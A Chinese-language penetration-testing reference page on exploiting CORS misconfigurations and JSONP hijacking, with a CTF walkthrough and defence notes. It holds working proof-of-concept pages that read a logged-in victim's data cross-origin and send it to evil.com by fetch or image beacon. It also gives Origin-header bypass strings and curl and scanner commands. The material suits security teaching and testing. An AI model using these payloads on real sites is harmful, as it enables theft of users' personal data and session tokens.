# CORS 误配与 JSONP 劫持

## 一句话理解
跨域机制（CORS / JSONP）是为了"受控地放开同源策略"。配置一旦失误，攻击者的恶意页面就能**带着受害者的登录态读取敏感数据**——CSRF 是"帮你发请求"（写），CORS/JSONP 劫持是"替你读数据"（读）。

## 核心原理
原理层见 [VUL-CrossDomain](../vul/VUL-CrossDomain.md)，本篇聚焦利用。
- 同源策略（SOP）默认阻止跨域**读取**响应
- CORS 通过 `Access-Control-Allow-Origin`（ACAO）等响应头声明"哪些源可以读"
- `Access-Control-Allow-Credentials: true`（ACAC）表示允许浏览器带 Cookie 发起跨域读取
- 当 ACAO 由请求中的 `Origin` 头动态反射生成时，任意站点都被放行

## CORS 常见误配类型
### 1. 反射 Origin + 允许凭证（最严重）
服务端把请求的 `Origin` 原样写回 ACAO，且 ACAC 为 true。任意恶意站点可读受害者数据。

### 2. 信任 `null` Origin
白名单里写了 `null`。攻击者用 sandbox iframe 制造 null origin：

```html
<iframe sandbox="allow-scripts" srcdoc="<script>
fetch('https://target.com/api/me', {credentials:'include'})
  .then(r=>r.text()).then(d=>location='https://evil.com/?'+btoa(d))
</script>"></iframe>
```

### 3. 域名校验写错
- 前缀匹配：`https://target.com.evil.com` 通过
- 后缀匹配：`https://eviltarget.com` 通过
- 用 `includes()` 判断：`https://evil.com/?x=target.com` 通过

### 4. 信任全部子域 + 子域存在 XSS/接管
白名单放行 `*.target.com`，攻击者先拿下一个子域（XSS、子域接管），再从子域发起带凭证的跨域读取。

### 5. `ACAO: *` 的边界
`*` 与 credentials 不能同时生效（浏览器会拦截），所以 `*` 本身只能读公开资源——但如果服务端按 Cookie 区分返回内容，公开接口也可能泄露信息。

### 6. 特殊字符 Origin 绕过（正则缺陷）
服务端用正则校验 Origin 时，若正则书写不严谨（`.*` 贪婪、`.` 未转义、锚定缺失），可插入 `{}` 等特殊字符欺骗校验。核心思想：**让正则"以为"匹配到了目标域，而域名的实际控制权在攻击者手里**。

**前缀误配场景**（正则只锚定开头、未锚定结尾，如 `^https?://target\.com`）：

```text
Origin: https://target.com.evil.com       # 攻击者注册该域，前缀满足即放行
Origin: https://target.com.evil.com:8443  # 端口也不校验时的变体
Origin: https://target.com{}.evil.com     # {} 扰乱部分正则的贪婪匹配，探测用
```

**后缀误配场景**（正则只锚定结尾、开头用 `.*` 匹配，如 `^https?://.*\.target\.com$`）：

```text
Origin: https://eviltarget.com            # 结尾恰为 target.com（缺少分隔点锚定）即通过
Origin: https://evil.target.com           # 若子域注册开放/未校验归属
Origin: https://evil.com{}.target.com     # .* 会吞掉 evil.com{}（含非法字符），正则被欺骗
```

curl 快速验证：

```bash
curl -s -I -H "Origin: https://evil.com{}.target.com" https://target.com/api/user
curl -s -I -H "Origin: https://target.com{}.evil.com" https://target.com/api/user
# 若响应 ACAO 原样反射这些畸形 Origin，说明校验逻辑有缺陷
```

注意：`{}` 不是合法 DNS 字符，浏览器不会为攻击者的真实页面发出这种 Origin。此类 payload 的价值在于**探测服务端校验行为**（畸形 Origin 仍被反射 = 校验代码有洞），实战利用要回到前缀/后缀误配上，注册 `target.com.evil.com` 这类合法域名完成。

## 利用 PoC（反射 Origin 型）
攻击者页面：

```html
<script>
fetch('https://target.com/api/userinfo', {credentials: 'include'})
  .then(r => r.json())
  .then(data => fetch('https://evil.com/collect', {method: 'POST', body: JSON.stringify(data)}));
</script>
```

受害者登录状态下访问恶意页面，其账号数据即被外带。

## 快速判断

```bash
curl -s -I -H "Origin: https://evil.com" https://target.com/api/userinfo
```

观察响应头：
- `Access-Control-Allow-Origin: https://evil.com`（反射）且 `Access-Control-Allow-Credentials: true` -> 高危
- ACAO 为 `null`、子域、前缀绕过 -> 按类型构造利用
- 无 ACAO 或无凭证 -> 无法带身份读，降级为普通信息收集

## 工具
### CORScanner
覆盖反射 / `null` / 前缀 / 后缀 / 子域 / 特殊字符等全部常见误配类型：

```bash
# 单目标扫描
python3 cors_scan.py -u https://target.com
# 批量 + 挂 Burp 代理复测
python3 cors_scan.py -i urls.txt -t 100 -p http://127.0.0.1:8080
```

### Corsy
轻量快速的单目标检测：

```bash
python3 corsy.py -u https://target.com
```

> 注：`cycors` 未在 GitHub / 公开渠道找到对应工具，此处以主流等价工具 Corsy（s0md3v）替代。

## JSONP 劫持
### 原理
JSONP 用 `<script src>` 天然跨域。接口把数据包在回调函数里返回：

```javascript
callback({"uid": 1001, "phone": "138****1234"})
```

若接口敏感数据 + callback 可控 + 无 Referer/Token 校验，攻击者页面定义同名回调即可读走数据。

### PoC

```html
<script>
function steal(d) {
  new Image().src = 'https://evil.com/?' + encodeURIComponent(JSON.stringify(d));
}
</script>
<script src="https://target.com/api/getUserInfo?callback=steal"></script>
```

### 判断要点
- 接口返回 `callback(...)` 格式且含敏感数据（手机号、身份证、地址）
- callback 参数名常见：`callback`、`cb`、`jsonp`、`jsonpcallback`
- 校验 Referer 弱或不存在（空 Referer 有时也能过，可配合 `<meta name="referrer" content="never">`）

### 完整案例

```text
1. 信息收集时发现接口：
   https://target.com/api/getProfile?uid=1&callback=jQuery1123_1234567890
   响应：jQuery1123_1234567890({"uid":1,"phone":"13812345678","email":"victim@qq.com"})
2. 验证 callback 是否可控：
   改成 callback=steal -> 响应变成 steal({"uid":1,...})
   说明回调函数名完全跟随参数
3. 构造 PoC 页（挂到 evil.com）：
```

```html
<html>
<body>
<script>
  // 定义与 callback 参数同名的函数，接口返回时被自动调用，数据到手
  function steal(d) {
    // 用图片请求把数据外带到攻击者服务器
    new Image().src = 'https://evil.com/collect?d=' + encodeURIComponent(JSON.stringify(d));
  }
</script>
<script src="https://target.com/api/getProfile?uid=1&callback=steal"></script>
</body>
</html>
```

```text
4. 受害者（登录状态）访问 PoC 页后，攻击者服务器收到的报文：
   GET /collect?d=%7B%22uid%22%3A1%2C%22phone%22%3A%2213812345678%22%2C%22email%22%3A%22victim%40qq.com%22%7D HTTP/1.1
   Host: evil.com
   ...
   URL 解码即：{"uid":1,"phone":"13812345678","email":"victim@qq.com"}
```

### JSONP + CORS 组合场景
- **双通道冗余**：同一接口若同时暴露 JSONP（callback 参数）和 CORS 反射，修复一侧后另一侧仍能读走数据——报告时两条都要提
- **防御差异利用**：不少站点 CORS 白名单收得很严（精确匹配），但历史 JSONP 接口无人维护、无 Referer 校验——JSONP 是"绕过严格 CORS"的旁路
- **信息拼图**：JSONP 读老接口拿手机号/历史订单，CORS 读新接口拿 token/会话信息，组合出完整个人信息画像
- **绕过 CSP**：若目标 CSP 只限制了 `connect-src`（拦 fetch）而 `script-src` 放开（常见配置错误），`<script src>` 的 JSONP 通道仍然可用

## 与 CSRF 的分工

| 维度 | CSRF | CORS/JSONP 劫持 |
| --- | --- | --- |
| 方向 | 写（发起状态变更） | 读（窃取响应数据） |
| 依赖 | 浏览器自动带凭证 | 服务端跨域放行 + 自动带凭证 |
| 防护 | SameSite / Token / Origin 校验 | 严格 ACAO 白名单 / Referer 校验 |

组合拳：CORS 可读 -> 读走 CSRF Token -> 再打 CSRF，防不胜防。

## 案例
CORS CTF 题完整流程（反射 Origin + 凭证窃取）：

```text
1. 信息收集：目标 https://cors.ctf.io，页面 JS 里发现请求
   https://cors.ctf.io/api/user/info，返回当前登录用户的 JSON
2. curl 带 Origin 手工验证（关键一步）：

   curl -s -i -H "Origin: https://evil.com" https://cors.ctf.io/api/user/info

   响应关键头：
   HTTP/1.1 200 OK
   Access-Control-Allow-Origin: https://evil.com      # 任意 Origin 被反射
   Access-Control-Allow-Credentials: true             # 且允许携带凭证

3. 结论：任意源 + 凭证 = 可窃取任意登录用户数据。
   flag 在 admin 账号的接口返回里，CTF 通常提供 bot 模拟管理员访问链接
4. 构造 PoC 页并部署到 https://evil.com/poc.html：
```

```html
<html>
<body>
<script>
  // 带受害者 Cookie 跨域读取 API 数据
  fetch('https://cors.ctf.io/api/user/info', {credentials: 'include'})
    .then(r => r.text())
    .then(d => {
      // 数据外带：把含 flag 的响应发到攻击者收集端点
      new Image().src = 'https://evil.com/x?d=' + encodeURIComponent(d);
    });
</script>
</body>
</html>
```

```text
5. 把 PoC URL 提交给题目 bot，bot 以 admin 身份访问后，攻击者侧收到：
   GET /x?d=%7B%22user%22%3A%22admin%22%2C%22flag%22%3A%22flag%7Bc0rs_1s_e4sy%7D%22%7D HTTP/1.1
   Host: evil.com
   URL 解码：{"user":"admin","flag":"flag{c0rs_1s_e4sy}"}
```

## 防御要点
- ACAO 使用精确白名单匹配（全等比较，不用 includes/正则偷懒）
- 非必要不开 `Access-Control-Allow-Credentials`
- JSONP 接口校验 Referer + 一次性 Token，敏感接口干脆禁用 JSONP
- 敏感响应加 `X-Content-Type-Options: nosniff`，减少被当脚本解析的风险

## 参考
- [PortSwigger - CORS](https://portswigger.net/web-security/cors)
- [PortSwigger - Exploiting CORS misconfigurations](https://portswigger.net/web-security/cors/exploiting)
- [CORScanner - GitHub](https://github.com/chenjj/CORScanner)
- [跨域安全（原理篇）](../vul/VUL-CrossDomain.md)
